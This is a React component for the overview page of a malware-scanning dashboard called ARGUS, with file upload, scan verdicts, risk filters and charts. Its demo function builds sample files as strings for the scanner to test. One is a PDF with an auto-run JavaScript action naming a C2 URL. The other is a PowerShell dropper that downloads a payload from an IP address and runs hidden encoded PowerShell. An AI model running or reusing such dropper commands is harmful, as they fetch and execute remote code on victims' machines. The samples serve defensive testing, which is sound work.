import React, { useEffect, useState, useRef } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Upload,
  Activity,
  HardDrive,
  Search,
  FileCode,
  Check,
  Copy,
  ArrowRight,
  ArrowUpRight,
  RefreshCw,
  Network,
  Play,
  Sparkles,
  CheckCircle2,
  XCircle,
  Clock,
  Layers,
  Cpu,
  Lock,
  ChevronRight,
  FileText,
  AlertCircle,
} from 'lucide-react';
import {
  PieChart,
  Pie,
  Cell,
  ResponsiveContainer,
  Tooltip,
} from 'recharts';
import { api } from '../services/api';
import { MetricsOverview, InvestigationSummary, EvidenceItem } from '../types';
import { ScanVerdictModal } from '../components/modals/ScanVerdictModal';

interface OverviewProps {
  onSelectInvestigation: (id: string) => void;
  onNavigateToInvestigate: () => void;
  onNavigateToDefense?: (id: string) => void;
  onNavigateToGraph?: (id: string) => void;
}

export const Overview: React.FC<OverviewProps> = ({
  onSelectInvestigation,
  onNavigateToInvestigate,
  onNavigateToDefense,
  onNavigateToGraph,
}) => {
  const [metrics, setMetrics] = useState<MetricsOverview | null>(null);
  const [investigations, setInvestigations] = useState<InvestigationSummary[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [riskFilter, setRiskFilter] = useState<'ALL' | 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'THREATS'>('ALL');
  const [searchQuery, setSearchQuery] = useState('');
  const [launchingDemo, setLaunchingDemo] = useState<string | null>(null);
  const [copiedSha, setCopiedSha] = useState<string | null>(null);

  // Direct In-Home File Scanner State (Super easy for any user)
  const [dragActive, setDragActive] = useState(false);
  const [scanning, setScanning] = useState(false);
  const [scanStage, setScanStage] = useState('');
  const [scanVerdict, setScanVerdict] = useState<InvestigationSummary | null>(null);
  const [scanEvidence, setScanEvidence] = useState<EvidenceItem[]>([]);
  const [scanPopupOpen, setScanPopupOpen] = useState(false);
  const [scanError, setScanError] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const fetchData = async () => {
    setLoading(true);
    let metricsData: MetricsOverview | null = null;
    let invsData: InvestigationSummary[] = [];
    let errMessage: string | null = null;

    try {
      metricsData = await api.getMetricsOverview();
    } catch (err: any) {
      console.warn('Backend metrics fetch notice:', err);
      errMessage = err.message || 'Connecting to backend';
    }

    try {
      invsData = await api.getInvestigations({ limit: 50 });
    } catch (err: any) {
      console.warn('Backend investigations fetch notice:', err);
      if (!errMessage) errMessage = err.message || 'Connecting to backend';
    }

    if (metricsData) {
      setMetrics(metricsData);
    }
    if (invsData && invsData.length > 0) {
      setInvestigations(invsData);
    }

    setError(errMessage);
    setLoading(false);
  };

  useEffect(() => {
    fetchData();
  }, []);

  const handleScanFile = async (file: File) => {
    try {
      setScanning(true);
      setScanError(null);
      setScanVerdict(null);
      setScanEvidence([]);
      setScanPopupOpen(false);
      setScanStage('Securing file in quarantined sandbox...');

      const timer1 = setTimeout(() => {
        setScanStage('Running non-executing byte & YARA inspection...');
      }, 350);

      const timer2 = setTimeout(() => {
        setScanStage('Evaluating dual ML models & attack causality...');
      }, 700);

      const res = await api.analyzeFile(file);
      clearTimeout(timer1);
      clearTimeout(timer2);

      let evList: EvidenceItem[] = [];
      try {
        evList = await api.getEvidence(res.id);
      } catch (e) {
        console.warn('Could not fetch evidence items for popup modal:', e);
      }

      setScanVerdict(res);
      setScanEvidence(evList);
      setScanPopupOpen(true);
      await fetchData();
    } catch (err: any) {
      setScanError(err.message || 'Analysis failed. Please try another file.');
    } finally {
      setScanning(false);
    }
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragActive(false);
    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
      handleScanFile(e.dataTransfer.files[0]);
    }
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      handleScanFile(e.target.files[0]);
    }
  };

  const handleLaunchQuickDemo = async (sampleType: 'exploit' | 'powershell' | 'safe') => {
    try {
      setLaunchingDemo(sampleType);
      let content = '';
      let filename = '';
      if (sampleType === 'exploit') {
        content = '%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n4 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("http://malicious-c2-update.org/payload.exe");) >>\nendobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000074 00000 n\n0000000133 00000 n\n0000000204 00000 n\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n340\n%%EOF';
        filename = 'urgent_action_document.pdf';
      } else if (sampleType === 'powershell') {
        content = '$wc = New-Object System.Net.WebClient\n$wc.DownloadFile("http://185.196.11.42/payload.bin", "$env:TEMP\\agent.exe")\npowershell -w hidden -enc aQB3AHIA...';
        filename = 'interactive_dropper_script.ps1';
      } else {
        content = 'ARGUS Verification Safe Sample\nStatus: Clean\nHash Integrity: Verified Nonce\nZero payload detected.';
        filename = 'ARGUS_safe_test_sample.txt';
      }
      const file = new File([content], filename, { type: 'application/octet-stream' });
      await handleScanFile(file);
    } catch (err: any) {
      alert(`Demo scan notice: ${err.message}`);
    } finally {
      setLaunchingDemo(null);
    }
  };

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedSha(id);
    setTimeout(() => setCopiedSha(null), 2000);
  };

  const totalCount = metrics?.total_investigations || investigations.length || 0;
  const totalThreats = (metrics?.critical_risk_count || 0) + (metrics?.high_risk_count || 0);
  const lowCount = metrics?.low_risk_count || 0;

  // 4 Vibrant Top Stat Cards
  const statCards = [
    {
      id: 'ALL' as const,
      title: 'Total Files Scanned',
      value: metrics?.total_investigations || investigations.length || 0,
      sub: 'All analyzed files in database',
      badge: 'All Files',
      icon: HardDrive,
      borderClass: 'border-slate-800 hover:border-blue-500/50',
      activeBorderClass: 'border-blue-500 ring-1 ring-blue-500/30 bg-blue-950/20',
      iconBg: 'bg-blue-500/10 text-blue-400 border border-blue-500/20',
      badgeClass: 'text-blue-400 bg-blue-500/10',
    },
    {
      id: 'THREATS' as const,
      title: 'Threats Detected',
      value: totalThreats,
      sub: `${metrics?.critical_risk_count || 0} Critical • ${metrics?.high_risk_count || 0} High`,
      badge: 'Malware Found',
      icon: ShieldAlert,
      borderClass: 'border-slate-800 hover:border-rose-500/50',
      activeBorderClass: 'border-rose-500 ring-1 ring-rose-500/30 bg-rose-950/20',
      iconBg: 'bg-rose-500/10 text-rose-400 border border-rose-500/20',
      badgeClass: 'text-rose-400 bg-rose-500/10',
    },
    {
      id: 'CRITICAL' as const,
      title: 'Critical Incidents',
      value: metrics?.critical_risk_count || 0,
      sub: 'Score 85–100 • Immediate action',
      badge: 'High Danger',
      icon: AlertTriangle,
      borderClass: 'border-slate-800 hover:border-orange-500/50',
      activeBorderClass: 'border-orange-500 ring-1 ring-orange-500/30 bg-orange-950/20',
      iconBg: 'bg-orange-500/10 text-orange-400 border border-orange-500/20',
      badgeClass: 'text-orange-400 bg-orange-500/10',
    },
    {
      id: 'LOW' as const,
      title: 'Clean & Safe Files',
      value: lowCount,
      sub: 'Score 0–29 • Verified harmless',
      badge: 'Clean',
      icon: ShieldCheck,
      borderClass: 'border-slate-800 hover:border-emerald-500/50',
      activeBorderClass: 'border-emerald-500 ring-1 ring-emerald-500/30 bg-emerald-950/20',
      iconBg: 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20',
      badgeClass: 'text-emerald-400 bg-emerald-500/10',
    },
  ];

  // Colorful palette for the threat distribution chart
  const riskDist = [
    { name: 'Critical', value: metrics?.critical_risk_count || 0, color: '#f43f5e' }, // Rose 500
    { name: 'High', value: metrics?.high_risk_count || 0, color: '#f97316' },     // Orange 500
    { name: 'Medium', value: metrics?.medium_risk_count || 0, color: '#eab308' }, // Yellow 500
    { name: 'Low', value: metrics?.low_risk_count || 0, color: '#10b981' },       // Emerald 500
  ];

  const filteredInvestigations = investigations.filter((inv) => {
    let matchesRisk = true;
    if (riskFilter === 'CRITICAL') matchesRisk = inv.risk_level === 'CRITICAL';
    else if (riskFilter === 'HIGH') matchesRisk = inv.risk_level === 'HIGH';
    else if (riskFilter === 'MEDIUM') matchesRisk = inv.risk_level === 'MEDIUM';
    else if (riskFilter === 'LOW') matchesRisk = inv.risk_level === 'LOW';
    else if (riskFilter === 'THREATS') matchesRisk = inv.risk_level === 'CRITICAL' || inv.risk_level === 'HIGH';

    const matchesSearch =
      searchQuery === '' ||
      inv.original_name.toLowerCase().includes(searchQuery.toLowerCase()) ||
      inv.sha256.toLowerCase().includes(searchQuery.toLowerCase());

    return matchesRisk && matchesSearch;
  });

  if (loading && !metrics && investigations.length === 0) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[50vh] gap-3">
        <RefreshCw className="w-8 h-8 text-indigo-400 animate-spin" />
        <span className="text-sm text-slate-300 font-medium">Starting ARGUS Security Engine...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-10">
      {/* ======================================================== */}
      {/* 1. HERO FILE SCANNER: EASY ENOUGH FOR ANYONE TO USE      */}
      {/* ======================================================== */}
      <div className="relative overflow-hidden rounded-2xl border border-slate-800 bg-gradient-to-b from-slate-900 via-slate-900/95 to-[#0b0f19] p-6 sm:p-8 shadow-2xl shadow-indigo-950/20">
        {/* Subtle decorative glowing background blur */}
        <div className="absolute top-0 right-1/4 -mt-12 w-96 h-96 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="absolute bottom-0 left-10 -mb-12 w-80 h-80 bg-blue-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="relative z-10 flex flex-col items-center text-center max-w-3xl mx-auto">
          {/* Friendly pill badge */}
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-400 text-xs font-semibold mb-3">
            <Sparkles className="w-3.5 h-3.5" />
            <span>Instant AI Malware & Threat Scanner</span>
          </div>

          <h1 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">
            Check Any File For Viruses & Hidden Threats
          </h1>
          <p className="text-sm text-slate-400 mt-2 max-w-xl">
            Drop any document, script, or program below. We safely scan its structure, check known virus signatures, and use AI to tell you if it's safe—without running it on your device.
          </p>

          {/* DRAG AND DROP ZONE */}
          <div
            onDragOver={(e) => {
              e.preventDefault();
              setDragActive(true);
            }}
            onDragLeave={() => setDragActive(false)}
            onDrop={handleDrop}
            onClick={() => fileInputRef.current?.click()}
            className={`w-full mt-6 p-6 sm:p-8 rounded-xl border-2 border-dashed transition-all cursor-pointer select-none flex flex-col items-center justify-center gap-3 ${
              dragActive
                ? 'border-indigo-400 bg-indigo-950/40 scale-[1.01]'
                : scanning
                ? 'border-indigo-500/50 bg-slate-900/80 cursor-wait'
                : 'border-slate-700 hover:border-indigo-500/70 bg-slate-950/60 hover:bg-slate-900/60'
            }`}
          >
            <input
              ref={fileInputRef}
              type="file"
              onChange={handleFileChange}
              className="hidden"
            />

            {scanning ? (
              <div className="flex flex-col items-center gap-3 py-2">
                <div className="relative">
                  <div className="w-12 h-12 rounded-full border-3 border-indigo-500/30 border-t-indigo-400 animate-spin" />
                  <Shield className="w-6 h-6 text-indigo-400 absolute top-3 left-3" />
                </div>
                <div className="text-center">
                  <div className="text-sm font-semibold text-white">Scanning Sample...</div>
                  <div className="text-xs text-indigo-300 font-mono mt-0.5">{scanStage}</div>
                </div>
              </div>
            ) : (
              <>
                <div className="w-14 h-14 rounded-full bg-gradient-to-tr from-indigo-600/20 to-blue-500/20 border border-indigo-500/30 flex items-center justify-center text-indigo-400 shadow-inner group-hover:scale-105 transition-transform">
                  <Upload className="w-7 h-7" />
                </div>
                <div>
                  <div className="text-base font-semibold text-white">
                    Drag & Drop any file here, or <span className="text-indigo-400 underline underline-offset-2">click to browse</span>
                  </div>
                  <div className="text-xs text-slate-400 mt-1">
                    Supports PDF, EXE, PowerShell (.ps1), ZIP, Word, or any suspicious file (Max 100MB)
                  </div>
                </div>
              </>
            )}
          </div>

          {/* SCAN VERDICT CARD (Appears immediately after scan) */}
          {scanVerdict && !scanning && (
            <div
              className={`w-full mt-5 p-5 rounded-xl border text-left transition-all animate-in fade-in slide-in-from-top-2 duration-300 ${
                scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH'
                  ? 'bg-rose-950/30 border-rose-500/40 text-rose-200'
                  : scanVerdict.risk_level === 'MEDIUM'
                  ? 'bg-amber-950/30 border-amber-500/40 text-amber-200'
                  : 'bg-emerald-950/30 border-emerald-500/40 text-emerald-200'
              }`}
            >
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div className="flex items-start gap-3.5">
                  {scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH' ? (
                    <div className="w-10 h-10 rounded-full bg-rose-500/20 border border-rose-500/40 flex items-center justify-center text-rose-400 shrink-0">
                      <XCircle className="w-6 h-6" />
                    </div>
                  ) : scanVerdict.risk_level === 'MEDIUM' ? (
                    <div className="w-10 h-10 rounded-full bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-400 shrink-0">
                      <AlertTriangle className="w-6 h-6" />
                    </div>
                  ) : (
                    <div className="w-10 h-10 rounded-full bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 shrink-0">
                      <CheckCircle2 className="w-6 h-6" />
                    </div>
                  )}

                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-base font-bold text-white">
                        {scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH'
                          ? '🚨 Threat Detected: High Risk File!'
                          : scanVerdict.risk_level === 'MEDIUM'
                          ? '⚠️ Suspicious Elements Found'
                          : '✅ File is Safe & Clean'}
                      </span>
                      <span
                        className={`text-xs font-mono font-bold px-2 py-0.5 rounded-full ${
                          scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH'
                            ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
                            : scanVerdict.risk_level === 'MEDIUM'
                            ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                            : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                        }`}
                      >
                        Score: {scanVerdict.risk_score} / 100 ({scanVerdict.risk_level})
                      </span>
                    </div>

                    <p className="text-xs text-slate-300 mt-1">
                      File: <strong className="text-white">{scanVerdict.original_name}</strong> •{' '}
                      {scanVerdict.risk_level === 'LOW'
                        ? 'No malicious scripts, zero hidden exploits, and clean byte structure verified.'
                        : 'Identified hostile signatures, suspicious byte patterns, or automated execution triggers.'}
                    </p>
                  </div>
                </div>

                {/* 1-Click Action Buttons */}
                <div className="flex items-center gap-2 shrink-0">
                  <button
                    onClick={() => onSelectInvestigation(scanVerdict.id)}
                    className="px-3.5 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-white text-xs font-semibold border border-slate-700 transition-colors cursor-pointer"
                  >
                    View Details
                  </button>

                  {onNavigateToDefense && (scanVerdict.risk_level === 'CRITICAL' || scanVerdict.risk_level === 'HIGH') && (
                    <button
                      onClick={() => onNavigateToDefense(scanVerdict.id)}
                      className="px-3.5 py-2 rounded-lg bg-gradient-to-r from-rose-600 to-red-600 hover:from-rose-500 hover:to-red-500 text-white text-xs font-semibold shadow-md shadow-rose-900/30 transition-all cursor-pointer flex items-center gap-1.5"
                    >
                      <Shield className="w-3.5 h-3.5" />
                      <span>Fix & Defend</span>
                    </button>
                  )}

                  <button
                    onClick={() => {
                      setScanVerdict(null);
                      setScanError(null);
                    }}
                    className="p-2 rounded-lg hover:bg-slate-800 text-slate-400 hover:text-white transition-colors cursor-pointer text-xs"
                    title="Dismiss"
                  >
                    ✕
                  </button>
                </div>
              </div>
            </div>
          )}

          {scanError && (
            <div className="w-full mt-4 p-3 rounded-lg bg-rose-950/40 border border-rose-500/40 text-rose-300 text-xs flex items-center justify-between">
              <span className="flex items-center gap-2">
                <AlertCircle className="w-4 h-4 shrink-0" />
                <span>{scanError}</span>
              </span>
              <button
                onClick={() => setScanError(null)}
                className="text-xs hover:text-white underline cursor-pointer ml-2"
              >
                Dismiss
              </button>
            </div>
          )}

          {/* QUICK 1-CLICK TEST BUTTONS (Super easy for non-technical users to test right now) */}
          <div className="mt-5 flex flex-wrap items-center justify-center gap-2 text-xs">
            <span className="text-slate-400 text-xs font-medium mr-1">Or try a ready-made test sample:</span>

            <button
              onClick={() => handleLaunchQuickDemo('safe')}
              disabled={!!launchingDemo || scanning}
              className="px-3 py-1.5 rounded-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-medium flex items-center gap-1.5 transition-all cursor-pointer"
              title="Test with a clean, low-risk file"
            >
              {launchingDemo === 'safe' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>🟢 Test Clean File (Safe)</span>
            </button>

            <button
              onClick={() => handleLaunchQuickDemo('exploit')}
              disabled={!!launchingDemo || scanning}
              className="px-3 py-1.5 rounded-full bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 border border-rose-500/30 font-medium flex items-center gap-1.5 transition-all cursor-pointer"
              title="Test with a dangerous PDF exploit sample"
            >
              {launchingDemo === 'exploit' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>🔴 Test Dangerous Exploit</span>
            </button>

            <button
              onClick={() => handleLaunchQuickDemo('powershell')}
              disabled={!!launchingDemo || scanning}
              className="px-3 py-1.5 rounded-full bg-amber-500/10 hover:bg-amber-500/20 text-amber-300 border border-amber-500/30 font-medium flex items-center gap-1.5 transition-all cursor-pointer"
              title="Test with an obfuscated dropper script"
            >
              {launchingDemo === 'powershell' ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5 fill-current" />}
              <span>🟡 Test Script Dropper</span>
            </button>
          </div>
        </div>
      </div>

      {/* ======================================================== */}
      {/* 2. TOP 4 COLORFUL STAT CARDS (Interactive Quick Filters)  */}
      {/* ======================================================== */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {statCards.map((c) => {
          const Icon = c.icon;
          const isActive = riskFilter === c.id;
          return (
            <div
              key={c.id}
              onClick={() => setRiskFilter(isActive ? 'ALL' : c.id)}
              className={`p-4 rounded-xl border transition-all cursor-pointer select-none bg-slate-900/60 backdrop-blur-xs ${
                isActive ? c.activeBorderClass : c.borderClass
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-medium text-slate-300">{c.title}</span>
                <div className={`p-2 rounded-lg ${c.iconBg}`}>
                  <Icon className="w-4 h-4" />
                </div>
              </div>
              <div className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">{c.value}</div>
              <div className="flex items-center justify-between text-xs text-slate-400 mt-2">
                <span>{c.sub}</span>
                <span className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${c.badgeClass}`}>
                  {isActive ? 'Active' : c.badge}
                </span>
              </div>
            </div>
          );
        })}
      </div>

      {/* ======================================================== */}
      {/* 3. RECENT FILE SCANS & INVESTIGATIONS LIST               */}
      {/* ======================================================== */}
      <div className="p-5 sm:p-6 rounded-xl border border-slate-800 bg-slate-900/60 backdrop-blur-xs space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
          <div>
            <h2 className="text-base font-bold text-white flex items-center gap-2">
              <FileCode className="w-4 h-4 text-indigo-400" />
              <span>Scanned Files History</span>
            </h2>
            <p className="text-xs text-slate-400 mt-0.5">
              Click any file to view complete forensics, attack graphs, and defensive fixes.
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={fetchData}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-medium border border-slate-700 cursor-pointer transition-colors"
              title="Refresh investigations"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Refresh</span>
            </button>

            {riskFilter !== 'ALL' && (
              <button
                onClick={() => setRiskFilter('ALL')}
                className="text-xs text-indigo-400 hover:text-indigo-300 underline font-medium cursor-pointer"
              >
                Clear Filter ({riskFilter})
              </button>
            )}
          </div>
        </div>

        {/* Filter Search Input and Severity Buttons */}
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
          <div className="relative flex-1">
            <input
              type="text"
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              placeholder="Search by file name or SHA-256..."
              className="w-full px-3.5 py-2 pl-9 rounded-lg bg-slate-950/80 border border-slate-800 text-white text-xs focus:outline-none focus:border-indigo-500 placeholder:text-slate-500 transition-colors"
            />
            <Search className="w-4 h-4 text-slate-500 absolute left-3 top-2.5 pointer-events-none" />
          </div>

          <div className="flex items-center gap-1.5 overflow-x-auto pb-1 sm:pb-0 text-xs">
            <button
              onClick={() => setRiskFilter('ALL')}
              className={`px-3 py-1.5 rounded-lg font-medium transition-all cursor-pointer shrink-0 text-xs ${
                riskFilter === 'ALL'
                  ? 'bg-indigo-600 text-white font-semibold shadow-xs'
                  : 'bg-slate-800 text-slate-300 hover:text-white'
              }`}
            >
              All ({investigations.length})
            </button>
            <button
              onClick={() => setRiskFilter('THREATS')}
              className={`px-3 py-1.5 rounded-lg font-medium transition-all cursor-pointer shrink-0 text-xs ${
                riskFilter === 'THREATS'
                  ? 'bg-rose-600 text-white font-semibold shadow-xs'
                  : 'bg-slate-800 text-slate-300 hover:text-white'
              }`}
            >
              Threats ({totalThreats})
            </button>
            <button
              onClick={() => setRiskFilter('LOW')}
              className={`px-3 py-1.5 rounded-lg font-medium transition-all cursor-pointer shrink-0 text-xs ${
                riskFilter === 'LOW'
                  ? 'bg-emerald-600 text-white font-semibold shadow-xs'
                  : 'bg-slate-800 text-slate-300 hover:text-white'
              }`}
            >
              Clean ({lowCount})
            </button>
          </div>
        </div>

        {/* Investigations List */}
        {filteredInvestigations.length === 0 ? (
          <div className="py-12 text-center text-xs text-slate-400 space-y-2">
            <div>No file scans match current filter ({riskFilter}).</div>
            <button
              onClick={() => {
                setRiskFilter('ALL');
                setSearchQuery('');
              }}
              className="px-3 py-1.5 rounded-lg bg-slate-800 text-slate-200 text-xs cursor-pointer hover:bg-slate-700 font-medium"
            >
              Reset Filters
            </button>
          </div>
        ) : (
          <div className="space-y-2.5 max-h-[460px] overflow-y-auto pr-1">
            {filteredInvestigations.map((inv) => {
              const isCrit = inv.risk_level === 'CRITICAL';
              const isHigh = inv.risk_level === 'HIGH';
              const isMed = inv.risk_level === 'MEDIUM';
              const isLow = inv.risk_level === 'LOW';

              let badgeColor = 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20';
              let verdictLabel = 'SAFE / CLEAN';
              if (isCrit) {
                badgeColor = 'bg-rose-500/20 text-rose-300 border-rose-500/30 font-bold';
                verdictLabel = 'CRITICAL THREAT';
              } else if (isHigh) {
                badgeColor = 'bg-orange-500/20 text-orange-300 border-orange-500/30 font-semibold';
                verdictLabel = 'HIGH RISK';
              } else if (isMed) {
                badgeColor = 'bg-amber-500/20 text-amber-300 border-amber-500/30';
                verdictLabel = 'SUSPICIOUS';
              }

              return (
                <div
                  key={inv.id}
                  className="p-3.5 sm:p-4 rounded-xl bg-slate-950/60 hover:bg-slate-900 border border-slate-800 hover:border-slate-700 transition-all flex flex-col sm:flex-row sm:items-center justify-between gap-3 group"
                >
                  <div
                    onClick={() => onSelectInvestigation(inv.id)}
                    className="overflow-hidden cursor-pointer flex-1"
                  >
                    <div className="flex items-center gap-2.5">
                      <div className={`p-2 rounded-lg ${isLow ? 'bg-emerald-500/10 text-emerald-400' : 'bg-rose-500/10 text-rose-400'}`}>
                        {isLow ? <ShieldCheck className="w-4 h-4" /> : <ShieldAlert className="w-4 h-4" />}
                      </div>
                      <span className="text-sm font-semibold text-white group-hover:text-indigo-400 transition-colors truncate">
                        {inv.original_name}
                      </span>
                      <span className={`text-[10px] font-mono px-2 py-0.5 rounded-full border shrink-0 ${badgeColor}`}>
                        {inv.risk_score} / 100 • {verdictLabel}
                      </span>
                    </div>

                    <div className="flex items-center gap-2 text-xs text-slate-400 font-mono mt-1.5 ml-10">
                      <span>SHA-256: {inv.sha256.substring(0, 16)}...</span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          copyToClipboard(inv.sha256, inv.id);
                        }}
                        className="hover:text-white cursor-pointer"
                        title="Copy SHA-256 Hash"
                      >
                        {copiedSha === inv.id ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                  </div>

                  {/* 1-Click Direct Action Buttons */}
                  <div className="flex items-center gap-1.5 shrink-0 ml-10 sm:ml-0">
                    <button
                      onClick={() => onSelectInvestigation(inv.id)}
                      className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-indigo-600 hover:text-white text-slate-200 text-xs font-medium border border-slate-700 cursor-pointer transition-colors"
                      title="View forensic evidence breakdown"
                    >
                      Evidence
                    </button>

                    {onNavigateToGraph && (
                      <button
                        onClick={() => onNavigateToGraph(inv.id)}
                        className="px-2.5 py-1.5 rounded-lg bg-slate-800 hover:bg-indigo-600 hover:text-white text-slate-300 text-xs font-medium border border-slate-700 flex items-center gap-1 cursor-pointer transition-colors"
                        title="Open Attack Reconstruction Graph"
                      >
                        <Network className="w-3.5 h-3.5 text-slate-400" />
                        <span>Map</span>
                      </button>
                    )}

                    {onNavigateToDefense && (
                      <button
                        onClick={() => onNavigateToDefense(inv.id)}
                        className={`px-3 py-1.5 rounded-lg text-xs font-medium border flex items-center gap-1 cursor-pointer transition-colors ${
                          isLow
                            ? 'bg-slate-800 hover:bg-slate-700 text-slate-300 border-slate-700'
                            : 'bg-rose-500/10 hover:bg-rose-600 hover:text-white text-rose-300 border-rose-500/30'
                        }`}
                        title="Open Automated Defensive Fixes"
                      >
                        <Shield className="w-3.5 h-3.5" />
                        <span>{isLow ? 'Verify Fix' : 'Fix & Defend'}</span>
                      </button>
                    )}

                    <button
                      onClick={() => onSelectInvestigation(inv.id)}
                      className="p-1 rounded text-slate-500 group-hover:text-white transition-colors"
                    >
                      <ArrowUpRight className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* ======================================================== */}
      {/* ======================================================== */}
      {/* 4. THREAT SEVERITY BREAKDOWN & RISK DISTRIBUTION        */}
      {/* ======================================================== */}
      <div className="p-5 sm:p-6 rounded-xl border border-slate-800 bg-slate-900/60 backdrop-blur-xs">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-4 mb-4 border-b border-slate-800 gap-2">
          <div>
            <h3 className="text-sm font-semibold text-white">Threat Severity Breakdown & Incident Distribution</h3>
            <p className="text-xs text-slate-400 mt-0.5">Categorization of all analyzed samples by forensic risk rating</p>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-xs text-indigo-400 font-mono">Click category to filter</span>
            {riskFilter !== 'ALL' && (
              <button
                onClick={() => setRiskFilter('ALL')}
                className="text-xs font-medium text-slate-400 hover:text-white px-2 py-0.5 rounded bg-slate-800 border border-slate-700 cursor-pointer"
              >
                Clear Filter ({riskFilter})
              </button>
            )}
          </div>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-center">
          {/* Donut Chart */}
          <div className="lg:col-span-5 h-52 w-full flex items-center justify-center">
            <ResponsiveContainer width="100%" height="100%">
              <PieChart>
                <Pie
                  data={riskDist}
                  cx="50%"
                  cy="50%"
                  innerRadius={50}
                  outerRadius={78}
                  paddingAngle={4}
                  dataKey="value"
                  className="cursor-pointer"
                  onClick={(entry) => {
                    const level = entry.name.toUpperCase();
                    setRiskFilter((prev) => (prev === level ? 'ALL' : (level as any)));
                  }}
                >
                  {riskDist.map((entry, index) => (
                    <Cell
                      key={`cell-${index}`}
                      fill={entry.color}
                      stroke={riskFilter === entry.name.toUpperCase() ? '#ffffff' : '#0b0f19'}
                      strokeWidth={riskFilter === entry.name.toUpperCase() ? 2 : 1}
                      className="cursor-pointer hover:opacity-80 transition-opacity"
                    />
                  ))}
                </Pie>
                <Tooltip
                  contentStyle={{
                    backgroundColor: '#0f172a',
                    border: '1px solid #1e293b',
                    borderRadius: '8px',
                    fontSize: '12px',
                    color: '#ffffff',
                  }}
                />
              </PieChart>
            </ResponsiveContainer>
          </div>

          {/* Interactive Severity Category Cards */}
          <div className="lg:col-span-7 grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs">
            {riskDist.map((item) => {
              const isSelected = riskFilter === item.name.toUpperCase();
              const percent = totalCount > 0 ? ((item.value / totalCount) * 100).toFixed(1) : '0.0';
              return (
                <button
                  key={item.name}
                  onClick={() => setRiskFilter(item.name.toUpperCase() as any)}
                  className={`p-3.5 rounded-xl border text-left cursor-pointer transition-all flex items-center justify-between ${
                    isSelected
                      ? 'border-indigo-500 bg-indigo-950/40 ring-1 ring-indigo-500/30'
                      : 'border-slate-800 bg-slate-950/50 hover:bg-slate-800/80 hover:border-slate-700'
                  }`}
                >
                  <div className="flex items-center gap-3">
                    <div className="w-3 h-3 rounded-full shrink-0 shadow-xs" style={{ backgroundColor: item.color }} />
                    <div>
                      <div className="font-semibold text-white text-sm">{item.name} Risk</div>
                      <div className="text-slate-400 text-xs mt-0.5">
                        {item.name === 'Critical' && 'Score 85–100 (Immediate Danger)'}
                        {item.name === 'High' && 'Score 60–84 (Threat Indicators)'}
